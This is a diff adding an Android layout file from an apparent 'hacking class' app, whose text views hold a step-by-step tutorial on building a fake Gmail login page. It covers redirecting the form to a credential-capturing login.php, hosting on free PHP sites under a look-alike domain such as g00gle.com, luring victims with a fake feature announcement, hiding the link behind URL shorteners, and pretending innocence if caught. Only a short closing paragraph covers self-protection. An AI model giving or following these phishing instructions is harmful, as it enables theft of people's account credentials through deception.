@@ -1,0 +1,141 @@
+<ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools"
+    
+ xmlns:ads="http://schemas.android.com/apk/res-auto"
+    android:id="@+id/ScrollView1"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    android:background="@drawable/back_of_reading"
+    android:paddingBottom="0dp"
+    android:paddingLeft="@dimen/activity_horizontal_margin"
+    android:paddingRight="@dimen/activity_horizontal_margin"
+    android:paddingTop="0dp"
+    tools:context="com.sanki.hackingclass.Aa" >
+
+    <RelativeLayout
+        android:layout_width="match_parent"
+        android:layout_height="3063dp" >
+
+        <TextView
+            android:id="@+id/textView1"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_alignParentTop="true"
+            android:layout_centerHorizontal="true"
+            android:text="Phishing"
+            android:textAppearance="?android:attr/textAppearanceLarge"
+            android:textColor="#4b4b4b"
+            android:textStyle="bold" />
+
+        <ImageView
+            android:id="@+id/imageView1"
+            android:layout_width="280dp"
+            android:layout_height="180dp"
+            android:layout_below="@+id/textView1"
+            android:layout_centerHorizontal="true"
+            android:layout_marginTop="14dp"
+            android:src="@drawable/i" />
+
+        <TextView
+            android:id="@+id/textView2"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_below="@+id/imageView1"
+            android:layout_centerHorizontal="true"
+            android:layout_marginTop="14dp"
+            android:autoLink="web"
+            android:clickable="true"
+            android:text="What is Phishing ?\nPhishing is the act of attempting to acquire information such as usernames, passwords, and credit card details (and sometimes, indirectly, money) by masquerading as a trustworthy entity in an electronic communication. Communications purporting to be from popular social web sites, auction sites, online payment processors or IT administrators are commonly used to lure the unsuspecting public. Phishing emails may contain links to websites that are infected with malware etc. Phishing is typically carried out by email spoofing or instant messaging, and it often directs users to enter details at a fake website whose look and feel are almost identical to the legitimate one.\n\nThis tutorial will explain you how to create fake login page for phishing, in this case we are going to go with Gmail as an example. This Procedure can be used to make fake pages for any other website in the same way. Yahoo!, Facebook, Myspace – Any website you want can be made using this tutorial.\n\nStep 1:\nHead over to the website gmail.com. Right Click anywhere and Save the Page as an HTML file.\n\nStep 2:\nOnce you save the login page completely, you will see a HTML file and a folder with the name something like Email from google files.There will be two image files namely “google_transparent.gif”, “mail_logo.png”.\n\nStep3:\nNow we need to upload these images to any online image hosting website, for example – tinypic.com, postimage.com or photobucket.com. After uploading go to the image where you uploaded it and copy the URL of each image.\n\nStep4:\nOpen the HTML file in any text editor like NotePad or MS Word.(You can use CTRL + F for the following)- Search for “google_transparent.gif” (without quotes) and replace it with corresponding URL. Search for “mail_logo.png” (without quotes) and replace it with corresponding URL.\n\nStep 5:\nIn the same file, Search for :\naction=”https://www.google.com/accounts/ServiceLoginAuth”\n\nAnd replace it with :\naction=”http://yoursite.urlhere/login.php”\n\n(You have to write down your fake websites URL there, See Step 7 for creating it.)\nNow save the file.\n\nStep6:\nNow you need to create a PHP file called “login.php”. So open up a text editor (like NotePad) and type the following:"
+            android:textAppearance="?android:attr/textAppearanceMedium"
+            android:textColor="#4b4b4b" />
+
+        <ImageView
+            android:id="@+id/imageView2"
+            android:layout_width="wrap_content"
+            android:layout_height="160dp"
+            android:layout_alignParentLeft="true"
+            android:layout_below="@+id/textView2"
+            android:src="@drawable/phngtxt" />
+
+        <TextView
+            android:id="@+id/textView3"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_below="@+id/imageView2"
+            android:layout_centerHorizontal="true"
+            android:autoLink="web"
+            android:clickable="true"
+            android:text=" Step 7:\nOpen up notepad again and just save a new file as “pswrds.txt” without any contents.(Empty file)\n\nNow upload those three files(namely :- index.html, login.php, pswrds.txt) in any of subdomain Web hosting site. (Note: that web hosting service must have php feature.)\nYou can use the following :\nsites:110mb.com\nspam.com\njustfree.com\n007sites.com\n(or simply google it).\n\nFollow the instructions in the Web hosting site and setup you fake login page. Make sure you name the URL something like g00gle.com or anything that you think would be the least suspicious.(Just make sure the URL doesn’t stand out in the address bar as it may alert the victim.)\n\nStep 8:\nCreate a fake email account, that is if you prefer to send the phishing webpage link anonymously.\n\nStep 9:\nAnd now all you have to do is send the victim something like: ‘Gmail starts new feature : To use this service, log in to this page’ ,along with this send the link to your fake website.\n\nNote: For user to believe change your phishing web page url use any of free short url sites like : co.nr, co.cc,cz.cc\nThis will make users to believe that it is correct url.\nNevertheless, if you do get caught act like you had no clue: ‘OMG ! I logged in to that website too , I’m going to change my pass now ! you do the same, quickly !’.\n\nProtecting Yourself :\nPhishing webpages are meant to fool the victim into thinking that the website they are logging into is genuine whereas it is actually a completely different website. The only sure-fire way to protect oneself from being the victim is to always make sure that the website you are giving your account and password to is bona fide by simply peeking at the address bar in your web browser. Also, avoid following any links from any dodgy websites, scam emails or even the comment sections in various places.\nEveryone is guilty until proven innocent. Assume hostility or accept vulnerability."
+            android:textAppearance="?android:attr/textAppearanceMedium"
+            android:textColor="#4b4b4b" />
+
+        <RelativeLayout
+            android:id="@+id/relativeLayout1"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_alignParentLeft="true"
+            android:layout_below="@+id/textView3"
+            android:layout_marginTop="15dp" >
+
+            <ImageView
+                android:id="@+id/imageView8"
+                android:layout_width="60dp"
+                android:layout_height="50dp"
+                android:layout_alignParentLeft="true"
+                android:layout_alignParentTop="true"
+                android:src="@drawable/previous2" />
+
+            <ImageView
+                android:id="@+id/imageView3"
+                android:layout_width="60dp"
+                android:layout_height="50dp"
+                android:layout_alignParentLeft="true"
+                android:layout_alignParentTop="true"
+                android:src="@drawable/previous" />
+        </RelativeLayout>
+
+        <ImageView
+            android:id="@+id/imageView4"
+            android:layout_width="140dp"
+            android:layout_height="50dp"
+            android:layout_alignTop="@+id/relativeLayout1"
+            android:layout_centerHorizontal="true"
+            android:src="@drawable/rateintxt2" />
+
+        <ImageView
+            android:id="@+id/imageView5"
+            android:layout_width="140dp"
+            android:layout_height="50dp"
+            android:layout_alignTop="@+id/relativeLayout1"
+            android:layout_centerHorizontal="true"
+            android:src="@drawable/rateintxt" />
+
+        <TextView
+            android:id="@+id/textView4"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_alignParentLeft="true"
+            android:layout_below="@+id/relativeLayout1"
+            android:layout_marginTop="22dp"
+            android:textAppearance="?android:attr/textAppearanceLarge" />
+
+        <TextView
+            android:id="@+id/textView5"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_alignParentLeft="true"
+            android:layout_below="@+id/textView4"
+            android:textAppearance="?android:attr/textAppearanceLarge" />
+
+         <com.google.android.gms.ads.AdView
+        android:id="@+id/adView"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:layout_centerHorizontal="true"
+        android:layout_alignParentBottom="true"
+        ads:adSize="BANNER"
+        ads:adUnitId="@string/banner_ad_unit_id">
+    </com.google.android.gms.ads.AdView>
+    </RelativeLayout>
+
+</ScrollView>
